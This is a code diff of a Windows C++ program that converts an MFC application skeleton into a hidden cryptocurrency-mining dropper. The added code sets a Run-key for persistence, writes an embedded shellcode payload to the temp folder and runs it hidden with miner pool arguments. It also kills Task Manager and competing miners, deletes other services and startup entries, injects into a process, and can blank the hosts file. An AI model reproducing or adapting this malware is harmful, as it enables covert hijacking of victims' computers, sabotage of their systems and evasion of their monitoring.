@@ -4,51 +4,12 @@
 #include "stdafx.h"
 #include "WK2017.h"
 
-#include "MainFrm.h"
-#include "WK2017Doc.h"
-#include "WK2017View.h"
+
 #include "injection.h"
 #include "CPUusage.h"
-#ifdef _DEBUG
-#define new DEBUG_NEW
-#undef THIS_FILE
-static char THIS_FILE[] = __FILE__;
-#endif
+#include "ShellCode.h"
 
-/////////////////////////////////////////////////////////////////////////////
-// CWK2017App
 
-BEGIN_MESSAGE_MAP(CWK2017App, CWinApp)
-	//{{AFX_MSG_MAP(CWK2017App)
-	ON_COMMAND(ID_APP_ABOUT, OnAppAbout)
-		// NOTE - the ClassWizard will add and remove mapping macros here.
-		//    DO NOT EDIT what you see in these blocks of generated code!
-	//}}AFX_MSG_MAP
-	// Standard file based document commands
-	ON_COMMAND(ID_FILE_NEW, CWinApp::OnFileNew)
-	ON_COMMAND(ID_FILE_OPEN, CWinApp::OnFileOpen)
-	// Standard print setup command
-	ON_COMMAND(ID_FILE_PRINT_SETUP, CWinApp::OnFilePrintSetup)
-END_MESSAGE_MAP()
-
-/////////////////////////////////////////////////////////////////////////////
-// CWK2017App construction
-
-CWK2017App::CWK2017App()
-{
-	// TODO: add construction code here,
-	// Place all significant initialization in InitInstance
-}
-
-/////////////////////////////////////////////////////////////////////////////
-// The one and only CWK2017App object
-
-CWK2017App theApp;
-
-/////////////////////////////////////////////////////////////////////////////
-// CWK2017App initialization
-
-#include "stdafx.h"
 //#include "WkRat.h"
 #include <shellapi.h>
 #include <stdio.h>
@@ -60,35 +21,48 @@ CWK2017App theApp;
 #include <windows.h>
 #include <Tlhelp32.h>
 #include <string.h>
+#include <WinSvc.h>
 #pragma comment(linker, "/opt:nowin98") 
 #pragma comment (lib, "user32.lib")
 #pragma comment (lib, "ADVAPI32.lib")
 #pragma comment (lib, "shell32.lib")
 #pragma comment (lib, "kernel32.lib")
+#pragma comment (lib, "msvcrt.lib")
+#pragma comment (lib, "nafxcw.lib")
 #include <map>
 using namespace std;
 ///////////////
-struct FALLEN_DATA
+ struct FALLEN_DATA
 {
 	unsigned int finder;
-	char xxs[1000];
-	char filename[255];
-	char service[255];
-	char Registry[255];
-	char winProcess[255];
-	char linuxProcess[255];
-	char wininj[100];
+	char xxs[1000];			//运行命令
+	char filename[255];		//释放的文件名
+	char service[255];		//k的服务名
+	char Registry[255];		//k的注册表名
+	char winProcess[255];	//k的win进程名
+	char linuxProcess[255]; //k的linux进程名
+	char wininj[100];		//注入的win进程
+	char SerName[100];		//服务名称
+	char Serdisplay[128];	//显示名称
+	char Serdesc[256];		//服务描述
+	bool log;				//输出log
+	bool hosts;				//还原hosts
 }
 fallen_data =
 {
 	0xF9E28F8D,
-		"xxs",
-		"filename",
-		"123:456",
-		"123",
-		"abc.exe",
-		"abc",
-		"wps.exe"
+	"xxs",
+	"filename",
+	"123:456",
+	"123",
+	"abc.exe",
+	"abc",
+	"wps.exe",
+	"fuwmc",
+	"xiansmc",
+	"fuwumiaosu",
+	false,
+	false,
 };
 int lservice;
 int lRegistry;
@@ -116,7 +90,7 @@ map<int,CString> cutting(char* str,int count)
 map<int,CString> winProcess1;
 map<int,CString> service1;
 map<int,CString> Registry1;
-void cutting()
+void asscutting()
 {
 	
 	if (strcmp(fallen_data.winProcess,"0"))
@@ -159,44 +133,15 @@ BOOL IsExistProcess(CONST CHAR* szProcessName)  //进程判断
 
 
 
-BOOL FreeResFile(DWORD dwResName, LPCSTR lpResType, LPCSTR lpFilePathName)
-{
-	HMODULE hInstance = ::GetModuleHandle(NULL);//得到自身实例句柄  
-	// HINSTANCE hInstance=GetModuleHandle("AudioEngine.dll");//获得dll句柄
-	HRSRC hResID = ::FindResourceA(hInstance, MAKEINTRESOURCE(dwResName), lpResType);//查找资源  
-	HGLOBAL hRes = ::LoadResource(hInstance, hResID);//加载资源  
-	LPVOID pRes = ::LockResource(hRes);//锁定资源  
-	
-	if (pRes == NULL)//锁定失败  
-	{
-		return FALSE;
-	}
-	DWORD dwResSize = ::SizeofResource(hInstance, hResID);//得到待释放资源文件大小  
-	HANDLE hResFile = CreateFileA(lpFilePathName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);//创建文件  
-	
-	if (INVALID_HANDLE_VALUE == hResFile)
-	{
-		//TRACE("创建文件失败！");  
-		return FALSE;
-	}
-	
-	DWORD dwWritten = 0;//写入文件的大小     
-	WriteFile(hResFile, pRes, dwResSize, &dwWritten, NULL);//写入文件  
-	CloseHandle(hResFile);//关闭文件句柄  
-	
-	return (dwResSize == dwWritten);//若写入大小等于文件大小，返回成功，否则失败  
-	
-}
 
 void mining()
 {
-	
 	 CHAR szRunPath[MAX_PATH];
 	 ZeroMemory(szRunPath, MAX_PATH);
 	 GetModuleFileNameA(NULL, szRunPath, MAX_PATH);
 	 HKEY hkey;
 	 RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hkey);
-	 RegSetValueExA(hkey, "xxsdcyiyi", 0, REG_SZ, (const unsigned char*)(LPCTSTR)szRunPath, strlen(szRunPath));
+	 RegSetValueExA(hkey, fallen_data.SerName, 0, REG_SZ, (const unsigned char*)(LPCTSTR)szRunPath, strlen(szRunPath));
 	 RegCloseKey(hkey);//开机启用
 	 CHAR szWindowsTempDri[MAX_PATH];
 	 ZeroMemory(szWindowsTempDri, MAX_PATH);
@@ -206,10 +151,10 @@ void mining()
 	 //char SAiGt[] = {' ','-','a',' ','c','r','y','p','t','o','n','i','g','h','t',' ','-','o',' ','s','t','r','a','t','u','m','+','t','c','p',':','/','/','k','r','b','.','m','i','n','e','r','.','r','o','c','k','s',':','3','3','3','3',' ','- ','u',' ','K','b','i','X','2','K','H','s','7','a','p','1','j','s','R','2','m','V','N','k','G','j','c','Y','p','j','c','n','A','E','r','9','y','3','Q','S','2','5','b','s','x','p','C','i','X','H','h','r','f','j','g','C','z','9','z','a','z','w','x','w','N','E','C','N','K','c','Q','h','B','P','s','S','P','p','t','z','E','5','U','8','a','K','W','1','M','Q','n','u','T','W','j','a','2','J','W',' ','-','p',' ','x',' ','-','-','d','o','n','a','t','e','-','l','e','v','e','l','=','1','\0'};
      // char SAiGt[] = { "  -o stratum+tcp://pool.minexmr.com:5555 -u 44c4syaMqg2BBd1ALNtAihD19dKoQX4qiCXCsZqxSWuv7zkZoAmwATSiMR7DVPRirD8Dnzd3ZiByQgchX2CheVcD4Hzh7ne -p x --donate-level=1 --max-cpu-usage=75 " };
 	 wsprintfA(szFileName, "%s\\%s", szWindowsTempDri, fallen_data.filename);//连接
-	 FreeResFile(IDR_EXE2, "EXE", szFileName);//释放文件	
+	 ShellCodeSaveFile(szFileName);//释放文件	
 	 Sleep(0x1F4);
 	 ShellExecuteA(NULL, "open", szFileName, fallen_data.xxs, NULL, SW_HIDE);//代命令运行文件
-	}
+}
 
  DWORD Kid()
  {
@@ -251,21 +196,40 @@ void mining()
 
 void func()
 {
+	asscutting();
 	if (strcmp(fallen_data.winProcess,"0"))
 	{
-		for (int i= 0;i<lservice;i++)
+		for (int i= 0;i<lwinProcess;i++)
 		{
-			if (lservice=1)
-			{
-			
 			char tmp [50]="taskkill /f /im ";
 			strcat(tmp,winProcess1[i]);
-			}
+			WinExec(tmp,SW_HIDE);
 		}
 		
 		
 	}
-
+	if (strcmp(fallen_data.service,"0"))
+	{
+		SC_HANDLE service, scm;
+		scm = OpenSCManager(0, 0,SC_MANAGER_CREATE_SERVICE);
+		for (int i= 0;i<lservice;i++)
+		{
+			service = OpenService(scm, service1[i],SERVICE_ALL_ACCESS | DELETE);
+			DeleteService(service);
+		}
+		
+	}
+	if (strcmp(fallen_data.Registry,"0"))
+	{
+		HKEY hKey;
+		RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE ,&hKey);
+		for (int i= 0;i<lRegistry;i++)
+		{
+			RegDeleteValue(hKey,Registry1[i]);
+		}
+		RegCloseKey(hKey);
+		
+	}
 
 
 }
@@ -276,12 +240,17 @@ void func()
 	 int       nCmdShow)
 {	
 
-/*	if (!strcmp(fallen_data.wininj,"0"))
+	if (!strcmp(fallen_data.wininj,"0"))
 	{
 		HANDLE RemoteThreadHandle; 
 		EnablePriv();
 		CreateRemoteThreadProc(fallen_data.wininj);//注入进程
-	}*/
+	}
+	if (fallen_data.hosts)
+	{
+		fclose(fopen("C:\\Windows\\System32\\drivers\\etc\\hosts", "w"));
+	}
+	func();
 	strcat(fallen_data.filename,".exe");
 	char gPoMW[] = {'t','a','s','k','k','i','l','l',' ','/','f',' ','/','i','m',' ','T','a','s','k','m','g','r','.','e','x','e','\0'};
 	WinExec(gPoMW,SW_HIDE);  //先关闭一波任务管理器进程
@@ -295,6 +264,7 @@ void func()
 		}
 		else//如果挖矿进程不存在了
 		{
+			func();
 			Kid();//杀死其他挖矿进程
 			mining();//开始挖矿
 			Sleep(600);
@@ -302,61 +272,3 @@ void func()
 	}
 	return 0;
 }
-
-
-/////////////////////////////////////////////////////////////////////////////
-// CAboutDlg dialog used for App About
-
-class CAboutDlg : public CDialog
-{
-public:
-	CAboutDlg();
-
-// Dialog Data
-	//{{AFX_DATA(CAboutDlg)
-	enum { IDD = IDD_ABOUTBOX };
-	//}}AFX_DATA
-
-	// ClassWizard generated virtual function overrides
-	//{{AFX_VIRTUAL(CAboutDlg)
-	protected:
-	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
-	//}}AFX_VIRTUAL
-
-// Implementation
-protected:
-	//{{AFX_MSG(CAboutDlg)
-		// No message handlers
-	//}}AFX_MSG
-	DECLARE_MESSAGE_MAP()
-};
-
-CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
-{
-	//{{AFX_DATA_INIT(CAboutDlg)
-	//}}AFX_DATA_INIT
-}
-
-void CAboutDlg::DoDataExchange(CDataExchange* pDX)
-{
-	CDialog::DoDataExchange(pDX);
-	//{{AFX_DATA_MAP(CAboutDlg)
-	//}}AFX_DATA_MAP
-}
-
-BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
-	//{{AFX_MSG_MAP(CAboutDlg)
-		// No message handlers
-	//}}AFX_MSG_MAP
-END_MESSAGE_MAP()
-
-// App command to run the dialog
-void CWK2017App::OnAppAbout()
-{
-	CAboutDlg aboutDlg;
-	aboutDlg.DoModal();
-}
-
-/////////////////////////////////////////////////////////////////////////////
-// CWK2017App message handlers
-
